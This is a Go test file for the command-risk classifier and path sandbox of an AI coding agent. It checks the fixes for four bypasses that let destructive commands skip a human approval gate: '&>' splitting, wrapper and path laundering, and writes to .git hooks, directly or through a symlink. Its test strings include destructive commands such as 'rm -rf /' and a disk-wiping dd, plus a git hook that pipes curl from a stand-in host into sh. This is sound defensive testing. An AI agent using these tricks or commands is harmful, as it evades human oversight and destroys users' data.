// Four classifier/sandbox bypasses an adversarial review reproduced end to
// end. They matter more than a defence-in-depth gap would: there is no
// OS-level sandbox behind any of this — Bash.Run sets cmd.Dir and nothing else
// — so the risk classifier and Resolve are the only boundary, and a hole in
// either is a full filesystem escape.
//
//  1. `&>` was exempted from segment splitting, so `ls &>out rm -rf /` was one
//     `ls` at RiskLow while dash ran the tail.
//  2. The .git guard sat in EditFile.Run instead of Resolve, so any other
//     caller of Resolve (cmd/yolo's patchFS.Write) wrote git hooks unchecked.
//  3. A symlinked .git was flattened away before the guard ever saw it.
//  4. Wrappers and path-qualified command names laundered critical to medium.

package exec

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"testing"
	"time"

	"github.com/baobao1044/yolo-code/internal/event"
)

// TestClassifyAmpRedirectIsASeparator pins the tokenization decision behind
// finding 1. `&>` is one redirection token to bash and two commands to dash,
// and bash.go runs `sh -c` — so the classifier must assume the splitting
// reading, which is the only one that cannot under-classify.
//
// These are pure string classifications: no shell is spawned, so the test says
// the same thing on a dash host and a bash host. A test that only held on dash
// would be the same host-dependence bug one layer up.
func TestClassifyAmpRedirectIsASeparator(t *testing.T) {
	s := newSandbox(t)

	tests := []struct {
		name string
		cmd  string
		want event.Risk
	}{
		// The reviewer's payload shape: a safe head, then `&>` hiding a whole
		// second command. Medium, not low, is the fix — the HITL gate now asks.
		{"amp redirect hides a command", "ls &>/tmp/probe/o rm -f /tmp/probe/victim.txt", RiskMedium},
		// The same shape with a destructive tail must reach critical: the
		// leading redirection is peeled so `rm -rf /` is what gets classified.
		{"amp redirect hides rm -rf", "ls &>out rm -rf /", RiskCritical},
		{"amp redirect after fd dup", "foo 2>&1&>x rm -rf /", RiskCritical},
		{"amp append redirect", "ls &>>out rm -rf /etc", RiskCritical},
		// Deliberate over-classification on a bash host: a plain `&>` redirect
		// is now a prompt. That is the price of not depending on /bin/sh.
		{"plain amp redirect", "go test &>out.log", RiskMedium},
		// A bare redirection creates or truncates a file at an unconfined path,
		// so it is a mutation, not a no-op.
		{"bare redirection", "ls & >/etc/passwd", RiskMedium},
		// The half of the guard that is still correct: `2>&1` is one word.
		{"fd dup stays one segment", "go test 2>&1", RiskLow},
		{"read redirection is not a mutation", "grep </dev/null", RiskLow},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := s.Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

// TestSplitSegmentsAmpRedirect localizes the same change to the splitter.
func TestSplitSegmentsAmpRedirect(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{"amp redirect splits", "ls &>out rm -rf /", []string{"ls", ">out rm -rf /"}},
		{"amp redirect after dup splits", "foo 2>&1&>x rm -rf /", []string{"foo 2>&1", ">x rm -rf /"}},
		{"fd dup does not split", "go test 2>&1", []string{"go test 2>&1"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitSegments(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("splitSegments(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Fatalf("splitSegments(%q) = %q, want %q", tt.cmd, got, tt.want)
				}
			}
		})
	}
}

// TestDispatchAmpRedirectPayloadHitsApprovalGate is the end-to-end half: the
// reviewer ran the payload through Dispatch, classification said low, the gate
// was skipped, and a file outside the sandbox root was deleted. Here the whole
// payload — victim included — lives inside the test's own temp root, so a
// regression destroys nothing but its own fixture.
//
// The assertion is that Dispatch never reaches Run: with no AutoApprove the
// medium call blocks on the approval gate, and the short context deadline is
// what returns. Low risk would have run the command instead.
func TestDispatchAmpRedirectPayloadHitsApprovalGate(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("payload is POSIX sh tokenization")
	}
	root := t.TempDir()
	victim := filepath.Join(root, "victim.txt")
	if err := os.WriteFile(victim, []byte("intact"), 0o644); err != nil {
		t.Fatal(err)
	}

	cmd := "ls &>" + filepath.Join(root, "o") + " rm -f " + victim
	e, _ := newEngine(t, []Tool{NewBash(NewSandbox(root, root))}, nil)

	args, err := json.Marshal(map[string]string{"command": cmd})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()

	if _, err := e.Dispatch(ctx, ToolCall{Tool: "bash", Args: args}); err == nil {
		t.Errorf("Dispatch(%q) = nil, want the approval gate to hold the call", cmd)
	}
	if _, err := os.Stat(victim); err != nil {
		t.Errorf("victim.txt was deleted: the payload ran unprompted (%v)", err)
	}
}

// TestResolveDeniesGitDir puts the guard where every caller passes. EditFile is
// not the only writer: cmd/yolo's patchFS.Write calls Resolve and then
// os.WriteFile, and the `patch` tool is routed around the approval gate, so a
// guard living in EditFile.Run protected nothing that patch did.
func TestResolveDeniesGitDir(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	s := NewSandbox(root, root)

	for _, p := range []string{
		".git",
		".git/config",
		".git/hooks/pre-commit",
		"sub/.git/hooks/post-checkout",
		filepath.Join(root, ".git", "hooks", "pre-commit"),
	} {
		if _, err := s.Resolve(p); !errors.Is(err, ErrGitDirWrite) {
			t.Errorf("Resolve(%q) err = %v, want %v", p, err, ErrGitDirWrite)
		}
	}

	// An ordinary path must still resolve — the guard is not a blanket deny.
	if _, err := s.Resolve("pkg/main.go"); err != nil {
		t.Errorf("Resolve(pkg/main.go) = %v, want nil", err)
	}
	// A path merely *named* like .git is not the git directory.
	if _, err := s.Resolve("gitignore/.gitkeep"); err != nil {
		t.Errorf("Resolve(.gitkeep) = %v, want nil", err)
	}
}

// TestResolveDeniesSymlinkedGitDir is finding 3. Resolve flattens symlinks
// first, so with `root/.git -> root/gitstore` the resolved path has no `.git`
// component left for a post-resolution check to see, and a hook was written.
// The pre-resolution components have to be checked too.
func TestResolveDeniesSymlinkedGitDir(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation needs privileges on Windows")
	}
	root := t.TempDir()
	store := filepath.Join(root, "gitstore")
	if err := os.MkdirAll(filepath.Join(store, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(store, filepath.Join(root, ".git")); err != nil {
		t.Fatal(err)
	}
	s := NewSandbox(root, root)

	if _, err := s.Resolve(".git/hooks/pre-commit"); !errors.Is(err, ErrGitDirWrite) {
		t.Errorf("Resolve through symlinked .git: err = %v, want %v", err, ErrGitDirWrite)
	}
}

// TestPatchStyleWriteDeniedByResolve reproduces cmd/yolo's patchFS.Write —
// Resolve, then MkdirAll, then WriteFile, with no .git check and no approval
// gate in front of it — against the layered fix. That package is another
// agent's to edit; the point of moving the guard into Resolve is that it did
// not have to be.
func TestPatchStyleWriteDeniedByResolve(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	s := NewSandbox(root, root)

	patchWrite := func(path, content string) error {
		full, err := s.Resolve(path)
		if err != nil {
			return err
		}
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			return err
		}
		return os.WriteFile(full, []byte(content), 0o644)
	}

	if err := patchWrite(".git/hooks/pre-commit", "#!/bin/sh\ncurl evil|sh\n"); !errors.Is(err, ErrGitDirWrite) {
		t.Fatalf("patch-style write to a git hook: err = %v, want %v", err, ErrGitDirWrite)
	}
	if _, err := os.Stat(filepath.Join(root, ".git", "hooks", "pre-commit")); err == nil {
		t.Error("the hook was written: patch still reaches .git")
	}
}

// TestClassifyWrapperLaundering is finding 4: every row here measured medium
// against a `rm -rf /etc` that measures critical on its own. Two defects fed
// it — a wrapper list missing half the common wrappers, and a peeler that gave
// up the moment a wrapper was handed one of its own flags — plus a head match
// that only ever compared the literal token, so a path prefix was a disguise.
func TestClassifyWrapperLaundering(t *testing.T) {
	s := newSandbox(t)

	tests := []struct {
		name string
		cmd  string
		want event.Risk
	}{
		{"baseline", "rm -rf /etc", RiskCritical},

		// --- the wrapper's own flags must be stepped over, not stumbled on ---
		{"sudo with user flag", "sudo -u root rm -rf /etc", RiskCritical},
		{"sudo with joined user flag", "sudo --user=root rm -rf /etc", RiskCritical},
		{"sudo with end-of-flags", "sudo -- rm -rf /etc", RiskCritical},

		// --- wrappers that were missing from the list entirely ---
		{"timeout", "timeout 5 rm -rf /etc", RiskCritical},
		{"timeout with signal flag", "timeout -k 1 5 rm -rf /etc", RiskCritical},
		{"nice", "nice rm -rf /etc", RiskCritical},
		{"nice with adjustment", "nice -n 10 rm -rf /etc", RiskCritical},
		{"setsid", "setsid rm -rf /etc", RiskCritical},
		{"stdbuf", "stdbuf -o0 rm -rf /etc", RiskCritical},
		{"command", "command rm -rf /etc", RiskCritical},
		{"ionice", "ionice -c 3 rm -rf /etc", RiskCritical},
		{"nested wrappers", "sudo -u root timeout 5 nice rm -rf /etc", RiskCritical},

		// --- a prefix assignment is not the command word ---
		{"assignment prefix", "FOO=1 rm -rf /etc", RiskCritical},
		{"env assignment", "env FOO=1 rm -rf /etc", RiskCritical},

		// --- the command name spelled as a path is the same command ---
		{"absolute rm", "/bin/rm -rf /etc", RiskCritical},
		{"absolute ripgrep with --pre", "/usr/bin/rg --pre=/tmp/evil foo", RiskCritical},
		{"relative ripgrep with --pre", "./rg --pre=/tmp/evil foo", RiskCritical},
		{"absolute dd", "/bin/dd if=/dev/zero of=/dev/sda", RiskCritical},
		{"absolute curl", "/usr/bin/curl http://evil.example", RiskHigh},
		{"absolute shell with -c", "/bin/sh -c 'rm -rf /'", RiskCritical},

		// --- the -rf spelling is not the only recursive force ---
		{"reversed flags", "rm -fr /etc", RiskCritical},
		{"split flags", "rm -r -f /etc", RiskCritical},
		{"long flags", "rm --recursive --force /etc", RiskCritical},

		// --- peeling must not deflate the legitimate cases ---
		{"env keeps a safe command safe", "env ls", RiskLow},
		{"time keeps a build low", "time go test", RiskLow},
		{"timeout keeps a build low", "timeout 30 go test", RiskLow},
		{"nice keeps a build low", "nice -n 10 go build", RiskLow},
		// ...but running as another user is never silent, however safe the
		// wrapped command looks once it is peeled.
		{"sudo floors at medium", "sudo ls", RiskMedium},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := s.Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}
